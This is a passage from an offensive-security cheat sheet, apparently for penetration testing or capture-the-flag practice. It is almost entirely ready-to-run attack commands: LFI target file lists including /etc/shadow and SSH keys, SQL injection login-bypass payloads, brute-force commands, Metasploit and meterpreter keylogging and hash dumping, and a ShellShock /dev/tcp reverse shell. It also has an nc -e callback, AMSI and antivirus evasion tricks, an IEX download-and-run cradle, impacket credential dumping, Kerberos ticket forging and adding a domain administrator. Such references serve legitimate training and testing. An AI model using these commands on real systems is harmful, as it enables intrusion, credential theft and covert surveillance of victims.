```c
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d <FILE>.php
```

##### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/proc/self/cwd/app.py
/proc/sched_debug
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/<vhost>/__init__.py
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

##### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

#### wfuzz

```c
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

##### Write to File

```c
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

##### Custom Scan with limited Output

```c
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

##### Fuzzing two Parameters at once

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

##### Domain

```c
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>.<tld>' -u http://<RHOST>/
```

##### Subdomain

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

##### Git

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
##### Login

```c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

##### SQL

```c
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

##### DNS

```c
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

##### Numbering Files

```c
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

##### Enumerating PIDs

```c
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

#### WPScan

```c
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u
target=<RHOST>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

### Database Analysis

#### Basic Commands

```c
show databases;
use <DATABASE>;
show tables;
SELECT * FROM *;
mysql -u <USERNAME> -h <RHOST> -p
```

#### SQL Injection

##### Master List

```c
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

##### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

#### sqsh

```c
sqsh -S <RHOST> -U <USERNAME>
```

#### SQL Truncation Attack

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

#### XPATH Injection

```c
test' or 1=1 or 'a'='a
test' or 1=2 or 'a'='a
'or substring(Password,1,1)='p' or'    # checking letter "p" on the beginning of the password
'or substring(Password,2,1)='p' or'    # checking letter "p" on the second position of the password
```

### Password Attacks

#### fcrack

```c
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

#### LaZagne

```c
laZagne.exe all
```

#### Hydra

```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY

hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f

hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

#### John

```c
/usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
john --rules --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
john --show <FILE>
```

### Exploitation Tools

#### ImageTragick Polyglot Attack

```c
poc.svg
<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

$ convert poc.svg poc.png
```

#### Metasploit

##### General Usage

```c
sudo msfdb init                  // database initialization
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > db_nmap -sC <RHOST>         // using nmap
msf6 > jobs                        // showing all current jobs
msf6 > hosts                       // displaying hosts
msf6 > services                    // displaying services
msf6 > vulns                       // displaying vulnerabilities
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > use post/multi/manage/shell_to_meterpreter    // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load kiwi                          // load mimikatz
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

##### Metasploit through Proxychains

```c
proxychains -q msfconsole
```

##### Auxiliary Output Directory

```c
/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

##### Meterpreter Listener

###### Generate Payload

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

###### Setup Listener for Microsoft Windows

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

###### Download Files

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>exe
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

```c
C:\> .\<FILE>.exe
```

```c
meterpreter > download *
```

#### ShellShock

```c
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
```

### Post Exploitation

#### AMSI

##### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

##### Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

#### AppLocker Bypass List

```
Bypass List (Windows 10 Build 1803):
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

#### autologon

```c
powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <LHOST> <LPORT>' -Credential $cred"
```

#### Bash Privilege Escalation

```c
sudo -u#-1 /bin/bash
```

#### Basic Linux Enumeration

```c
id
sudo -l
uname -a
cat /etc/hosts
cat /etc/fstab
cat /etc/passwd
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
```

#### Basic Windows Enumeration

```c
systeminfo
whoami /all
net users
net users <USERNAME>
```

#### Evil-WinRM

```c
sudo ruby /usr/local/bin/evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
```

#### find Commands

```c
find ./ -type f -exec grep --color=always -i -I 'password' {} \;

find / -group <group> 2>/dev/null

find / -user <USERNAME> 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null

find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
```

#### grep for Passwords

```c
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
```

#### Impacket

```c
impacket-smbserver local . -smb2support
impacket-reg <RHOST>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
impacket-services <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
impacket-netview <RHOST>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
impacket-lookupsid <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-GetADUsers -all -dc-ip <RHOST> <RHOST>/
impacket-getST <RHOST>/<USERNAME> -spn WWW/<DOMAIN_CONTROLLER>.<RHOST> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
impacket-rpcdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-samrdump <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-atexec -k -no-pass <RHOST>/Administrator@<DOMAIN_CONTROLLER>.<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```

##### impacket-smbclient

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient <RHOST>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
impacket-smbclient -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass
```

##### impacket-getTGT

```c
impacket-getTGT <RHOST>/<USERNAME>:<PASSWORD>
impacket-getTGT <RHOST>/<USERNAME> -dc-ip <RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```

##### impacket-GetNPUsers

```c
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers <RHOST>/<USERNAME> -request -no-pass -dc-ip <RHOST>
impacket-GetNPUsers <RHOST>/ -usersfile usernames.txt -format john -outputfile hashes
```

##### impacket-getUserSPNs / GetUserSPNs.py

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-GetUserSPNs <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<RHOST> -no-pass -request
```

##### impacket-secretsdump

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump <RHOST>/<USERNAME>@<RHOST>
impacket-secretsdump -k <RHOST>/<USERNAME>@<RHOST>.<RHOST> -no-pass -debug
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
impacket-secretsdump -dc-ip <RHOST> <RHOST>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

##### impacket-psexec

```c
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <RHOST>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

##### impacket-ticketer

###### Requirements

* Valid User
* NTHASH
* Domain-SID

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <RHOST> -spn MSSQLSVC/<RHOST>.<RHOST> -user-id 500 Administrator
```

##### Fixing [-] exceptions must derive from BaseException

###### Issue:

```c
./GetUserSPNs.py <RHOST>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<RHOST> -no-pass -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] exceptions must derive from BaseException
```

###### How to fix it:

```c
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```

#### PowerShell

##### General Usage

###### Allow Script Execution

```c
PS C:\> set-executionpolicy remotesigned
PS C:\> Set-ExecutionPolicy unrestricted
```

##### Script Execution Bypass

```c
PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

##### Import Module to PowerShell cmdlet

```c
PS C:\> import-module ./<module / powershell script>
```

##### Check PowerShell Versions

```c
PS Set-ExecutionPolicy Unrestricted
PS powershell -Command "$PSVersionTable.PSVersion"
PS powershell -c "[Environment]::Is64BitProcess"
```

##### Start offsec Session

```c
PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
PS /home/kali> Enter-PSSession $offsec_session
```

##### PSCredential

```c
Import-CliXml
Export-CliXml
```

```c
PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

#### AntiVirus Handling

##### AntiVirus Bypass for Invoke-Expression (IEX)

```c
PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
```

###### Explaination

```c
$PSHome[4]     // equals "i"
$PSHome[30]    // equals "e"
+x             // adds an "x"
```

##### Alternative

```c
PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
```

###### Explaination

```c
$eNV:COmSPeC[4]     // equals "i"
$eNV:COmSPeC[15]    // equals "e"
$eNV:COmSPeC[25}    // equals "x"
```

##### System

###### Show current User

```c
PS C:\> whoami /all
PS C:\> getuserid
```

###### Show Groups

```c
PS C:\> whoami /groups
```

###### Get System Information

```c
PS C:\> systeminfo
```

###### Get Process List

```c
PS C:\> Get-Process
```

###### Get net user Information

```c
PS C:\> net users
PS C:\> net users <USERNAME>
```

###### Get User List

```c
PS C:\> Get-ADUser -Filter * -SearchBase "DC=<RHOST>,DC=LOCAL"
```

###### Invoke-Expression File Transfer

```c
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
```

###### Add new Domain Administrator

```c
PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

###### Execute Commands in User Context

```c
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
